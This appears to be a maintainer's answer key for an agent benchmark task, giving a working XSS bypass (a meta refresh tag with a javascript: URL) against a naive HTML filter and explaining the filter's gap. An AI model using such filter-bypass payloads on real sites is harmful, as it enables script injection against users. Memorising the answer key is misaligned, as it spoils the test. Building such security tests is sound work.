# Maintainer solutions (NOT copied into agent workspace)

Against the provided naive stdlib `filter.py`, a working bypass is:

```html
<meta http-equiv="refresh" content="0;url=javascript:alert(401)">
```

The filter only strips `javascript:` in `href`/`src`/`action`/`formaction`, not `content=`.

(Upstream TB2 used a BeautifulSoup filter + comment-parse bypass; this port uses a stdlib filter so the harness needs no `bs4`.)
